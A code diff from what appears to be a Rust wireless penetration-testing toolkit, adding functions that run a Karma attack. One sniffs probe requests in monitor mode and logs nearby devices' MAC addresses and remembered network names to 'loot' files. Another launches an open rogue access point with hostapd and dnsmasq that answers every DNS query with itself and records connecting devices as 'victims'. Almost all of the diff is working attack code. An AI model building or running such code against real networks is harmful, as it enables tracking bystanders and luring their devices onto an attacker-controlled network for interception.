@@ -6,12 +6,23 @@
 //! This is highly effective against devices with saved networks.
 
 use std::collections::HashMap;
+use std::fs;
+use std::io::Write;
 use std::path::PathBuf;
+use std::process::{Child, Command, Stdio};
 use std::sync::{
     atomic::{AtomicBool, Ordering},
     Arc, Mutex,
 };
-use std::time::{SystemTime, UNIX_EPOCH};
+use std::thread;
+use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
+
+use chrono::Local;
+
+use crate::capture::{CaptureFilter, PacketCapture};
+use crate::error::{Result, WirelessError};
+use crate::interface::WirelessInterface;
+use crate::probe::ProbeSniffer;
 
 /// Karma attack configuration
 #[derive(Debug, Clone)]
@@ -362,6 +373,401 @@ impl KarmaAttack {
 /// Quick function to start a Karma attack
 pub fn start_karma(config: KarmaConfig) -> KarmaAttack {
     KarmaAttack::new(config)
+}
+
+/// Karma execution result
+#[derive(Debug, Clone)]
+pub struct KarmaExecutionResult {
+    /// Attack result
+    pub result: KarmaResult,
+    /// Path where loot was saved
+    pub loot_path: PathBuf,
+}
+
+/// Execute a full Karma attack using passive probe sniffing
+///
+/// This function:
+/// 1. Sets up monitor mode for probe sniffing
+/// 2. Captures all probe requests from nearby devices
+/// 3. Logs all probes and discovered SSIDs
+/// 4. Saves loot to structured directories
+///
+/// # Arguments
+/// * `config` - Karma configuration
+/// * `loot_base` - Base loot directory
+/// * `progress` - Callback for progress updates
+pub fn execute_karma<F>(
+    config: KarmaConfig,
+    loot_base: Option<&str>,
+    progress: F,
+) -> Result<KarmaExecutionResult>
+where
+    F: Fn(&str) + Send + Sync + 'static,
+{
+    // Create loot directory
+    let base = loot_base.unwrap_or("loot/Wireless");
+    let timestamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
+    let loot_dir = PathBuf::from(base).join("karma").join(&timestamp);
+
+    fs::create_dir_all(&loot_dir)
+        .map_err(|e| WirelessError::System(format!("Failed to create loot dir: {}", e)))?;
+
+    progress("Starting Karma attack...");
+
+    // Create attack state
+    let attack = Arc::new(KarmaAttack::new(config.clone()));
+    attack.running.store(true, Ordering::SeqCst);
+
+    // Create log files
+    let probe_log_path = loot_dir.join("probes.log");
+    let summary_path = loot_dir.join("summary.txt");
+
+    let mut probe_log = fs::File::create(&probe_log_path)
+        .map_err(|e| WirelessError::System(format!("Failed to create probe log: {}", e)))?;
+
+    writeln!(probe_log, "# Karma Attack Probe Log").ok();
+    writeln!(
+        probe_log,
+        "# Started: {}",
+        Local::now().format("%Y-%m-%d %H:%M:%S")
+    )
+    .ok();
+    writeln!(probe_log, "# Format: timestamp,client_mac,ssid,signal_dbm").ok();
+
+    // Setup interface for monitor mode
+    let mut interface = WirelessInterface::new(&config.interface)?;
+    interface.set_monitor_mode()?;
+
+    if config.channel > 0 {
+        if let Err(e) = interface.set_channel(config.channel as u32) {
+            progress(&format!("Warning: Failed to set channel: {}", e));
+        }
+    }
+
+    progress(&format!(
+        "Monitor mode enabled on {} (channel {})",
+        config.interface, config.channel
+    ));
+
+    // Create packet capture
+    let filter = CaptureFilter {
+        probe_requests: true,
+        ..Default::default()
+    };
+
+    let mut capture = PacketCapture::new(&interface, filter)?;
+    let mut probe_sniffer = ProbeSniffer::new();
+
+    let attack_clone = Arc::clone(&attack);
+    let probe_log = Arc::new(Mutex::new(probe_log));
+    let progress = Arc::new(progress);
+    let start = Instant::now();
+    let duration = Duration::from_secs(config.duration as u64);
+
+    // Channel hopping if configured
+    let hop_channels = if config.channel == 0 {
+        vec![1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10]
+    } else {
+        vec![config.channel as u32]
+    };
+    let mut channel_index = 0;
+    let mut last_hop = Instant::now();
+    let hop_interval = Duration::from_millis(500);
+
+    // Main capture loop
+    while attack.is_running() {
+        if duration.as_secs() > 0 && start.elapsed() >= duration {
+            break;
+        }
+
+        // Channel hopping
+        if hop_channels.len() > 1 && last_hop.elapsed() >= hop_interval {
+            channel_index = (channel_index + 1) % hop_channels.len();
+            if let Err(e) = interface.set_channel(hop_channels[channel_index]) {
+                log::debug!("Channel hop failed: {}", e);
+            }
+            last_hop = Instant::now();
+        }
+
+        // Capture packets
+        match capture.capture_packet(Duration::from_millis(100)) {
+            Ok(Some(packet)) => {
+                if let Some(probes) = probe_sniffer.process_packet(&packet) {
+                    for (client_mac, ssid, signal) in probes {
+                        // Handle the probe
+                        attack_clone.handle_probe(&client_mac, &ssid, signal);
+
+                        // Log to file
+                        if let Ok(mut log) = probe_log.lock() {
+                            writeln!(
+                                log,
+                                "{},{},{},{}",
+                                Local::now().format("%H:%M:%S"),
+                                client_mac,
+                                ssid,
+                                signal
+                            )
+                            .ok();
+                        }
+
+                        // Progress update for new SSIDs
+                        let stats = attack_clone.get_stats();
+                        if stats.probes_seen % 10 == 0 {
+                            progress(&format!(
+                                "Karma: {} probes, {} SSIDs, {} clients",
+                                stats.probes_seen, stats.unique_ssids, stats.unique_clients
+                            ));
+                        }
+                    }
+                }
+            }
+            Ok(None) => {}
+            Err(e) => {
+                log::debug!("Capture error: {}", e);
+            }
+        }
+    }
+
+    // Get final results
+    let mut result = attack.get_result();
+    result.log_file = probe_log_path.clone();
+
+    // Write summary
+    let mut summary = fs::File::create(&summary_path)
+        .map_err(|e| WirelessError::System(format!("Failed to create summary: {}", e)))?;
+
+    writeln!(summary, "Karma Attack Summary").ok();
+    writeln!(
+        summary,
+        "Completed: {}",
+        Local::now().format("%Y-%m-%d %H:%M:%S")
+    )
+    .ok();
+    writeln!(summary, "Duration: {:?}", start.elapsed()).ok();
+    writeln!(summary, "").ok();
+    writeln!(summary, "Statistics:").ok();
+    writeln!(summary, "  Probes seen: {}", result.stats.probes_seen).ok();
+    writeln!(summary, "  Unique SSIDs: {}", result.stats.unique_ssids).ok();
+    writeln!(summary, "  Unique clients: {}", result.stats.unique_clients).ok();
+    writeln!(summary, "  Victims: {}", result.stats.victims).ok();
+    writeln!(summary, "").ok();
+    writeln!(summary, "SSIDs discovered:").ok();
+    for ssid in &result.ssids_seen {
+        if !ssid.is_empty() {
+            writeln!(summary, "  - {}", ssid).ok();
+        }
+    }
+
+    // Also save SSIDs to a separate file for easy processing
+    let ssids_path = loot_dir.join("ssids.txt");
+    let mut ssids_file = fs::File::create(&ssids_path)
+        .map_err(|e| WirelessError::System(format!("Failed to create ssids file: {}", e)))?;
+
+    for ssid in &result.ssids_seen {
+        if !ssid.is_empty() {
+            writeln!(ssids_file, "{}", ssid).ok();
+        }
+    }
+
+    // Restore managed mode
+    if let Err(e) = interface.set_managed_mode() {
+        log::warn!("Failed to restore managed mode: {}", e);
+    }
+
+    progress(&format!(
+        "Karma complete: {} probes, {} SSIDs, {} clients",
+        result.stats.probes_seen, result.stats.unique_ssids, result.stats.unique_clients
+    ));
+
+    Ok(KarmaExecutionResult {
+        result,
+        loot_path: loot_dir,
+    })
+}
+
+/// Karma attack with hostapd - responds to specific SSIDs
+///
+/// Unlike execute_karma which only sniffs probes, this variant actually
+/// creates fake APs for captured SSIDs using hostapd.
+pub fn execute_karma_with_ap<F>(
+    config: KarmaConfig,
+    ap_interface: &str,
+    loot_base: Option<&str>,
+    progress: F,
+) -> Result<KarmaExecutionResult>
+where
+    F: Fn(&str) + Send + Sync + 'static,
+{
+    let base = loot_base.unwrap_or("loot/Wireless");
+    let timestamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
+    let loot_dir = PathBuf::from(base).join("karma").join(&timestamp);
+
+    fs::create_dir_all(&loot_dir)
+        .map_err(|e| WirelessError::System(format!("Failed to create loot dir: {}", e)))?;
+
+    progress("Starting Karma attack with AP...");
+
+    let attack = Arc::new(KarmaAttack::new(config.clone()));
+    attack.running.store(true, Ordering::SeqCst);
+
+    // Use common target SSIDs for the attack
+    let target_ssids = if config.ssid_whitelist.is_empty() {
+        common_target_ssids()
+            .iter()
+            .take(5)
+            .map(|s| s.to_string())
+            .collect::<Vec<_>>()
+    } else {
+        config.ssid_whitelist.clone()
+    };
+
+    // We'll create hostapd config for the first target SSID
+    let primary_ssid = target_ssids.first().cloned().unwrap_or("FreeWiFi".to_string());
+
+    // Setup AP interface
+    Command::new("ip")
+        .args(["link", "set", ap_interface, "down"])
+        .output()
+        .ok();
+
+    Command::new("ip")
+        .args(["addr", "flush", "dev", ap_interface])
+        .output()
+        .ok();
+
+    Command::new("ip")
+        .args(["addr", "add", "192.168.4.1/24", "dev", ap_interface])
+        .output()
+        .ok();
+
+    Command::new("ip")
+        .args(["link", "set", ap_interface, "up"])
+        .output()
+        .ok();
+
+    // Create hostapd config
+    let hostapd_conf_path = loot_dir.join("hostapd.conf");
+    let hostapd_config = format!(
+        "interface={}\n\
+        driver=nl80211\n\
+        ssid={}\n\
+        hw_mode=g\n\
+        channel={}\n\
+        wmm_enabled=0\n\
+        macaddr_acl=0\n\
+        auth_algs=1\n\
+        ignore_broadcast_ssid=0\n\
+        wpa=0\n",
+        ap_interface,
+        primary_ssid,
+        if config.channel == 0 { 6 } else { config.channel }
+    );
+
+    fs::write(&hostapd_conf_path, &hostapd_config)
+        .map_err(|e| WirelessError::System(format!("Failed to write hostapd.conf: {}", e)))?;
+
+    // Start hostapd
+    let mut hostapd = Command::new("hostapd")
+        .arg(&hostapd_conf_path)
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()
+        .map_err(|e| WirelessError::System(format!("Failed to start hostapd: {}", e)))?;
+
+    // Start dnsmasq for DHCP
+    let dnsmasq_conf_path = loot_dir.join("dnsmasq.conf");
+    let dnsmasq_config = format!(
+        "interface={}\n\
+        dhcp-range=192.168.4.10,192.168.4.100,255.255.255.0,12h\n\
+        dhcp-option=3,192.168.4.1\n\
+        dhcp-option=6,192.168.4.1\n\
+        server=8.8.8.8\n\
+        log-queries\n\
+        log-dhcp\n\
+        listen-address=192.168.4.1\n\
+        bind-interfaces\n\
+        address=/#/192.168.4.1\n",
+        ap_interface
+    );
+
+    fs::write(&dnsmasq_conf_path, &dnsmasq_config)
+        .map_err(|e| WirelessError::System(format!("Failed to write dnsmasq.conf: {}", e)))?;
+
+    Command::new("pkill").args(["-9", "dnsmasq"]).output().ok();
+
+    let mut dnsmasq = Command::new("dnsmasq")
+        .args(["-C", &dnsmasq_conf_path.to_string_lossy(), "-d"])
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()
+        .map_err(|e| WirelessError::System(format!("Failed to start dnsmasq: {}", e)))?;
+
+    progress(&format!(
+        "Karma AP '{}' running on {}",
+        primary_ssid, ap_interface
+    ));
+
+    // Wait for attack duration
+    let start = Instant::now();
+    let duration = Duration::from_secs(config.duration as u64);
+
+    while start.elapsed() < duration && attack.is_running() {
+        thread::sleep(Duration::from_secs(5));
+
+        // Check connected clients
+        if let Ok(output) = Command::new("iw")
+            .args(["dev", ap_interface, "station", "dump"])
+            .output()
+        {
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            let client_count = stdout.matches("Station").count();
+            if client_count > 0 {
+                progress(&format!("Karma AP: {} clients connected", client_count));
+
+                // Record as victims
+                for line in stdout.lines() {
+                    if line.contains("Station") {
+                        if let Some(mac) = line.split_whitespace().nth(1) {
+                            attack.record_victim(mac, &primary_ssid, None);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Cleanup
+    let _ = hostapd.kill();
+    let _ = hostapd.wait();
+    let _ = dnsmasq.kill();
+    let _ = dnsmasq.wait();
+
+    Command::new("pkill").args(["-9", "hostapd"]).output().ok();
+    Command::new("pkill").args(["-9", "dnsmasq"]).output().ok();
+
+    // Reset interface
+    Command::new("ip")
+        .args(["addr", "flush", "dev", ap_interface])
+        .output()
+        .ok();
+
+    let result = attack.get_result();
+
+    // Write summary
+    let summary_path = loot_dir.join("summary.txt");
+    let mut summary = fs::File::create(&summary_path)?;
+
+    writeln!(summary, "Karma AP Attack Summary").ok();
+    writeln!(summary, "Primary SSID: {}", primary_ssid).ok();
+    writeln!(summary, "Duration: {:?}", start.elapsed()).ok();
+    writeln!(summary, "Victims: {}", result.stats.victims).ok();
+
+    progress(&format!("Karma AP complete: {} victims", result.stats.victims));
+
+    Ok(KarmaExecutionResult {
+        result,
+        loot_path: loot_dir,
+    })
 }
 
 /// List of commonly probed SSIDs that are good Karma targets
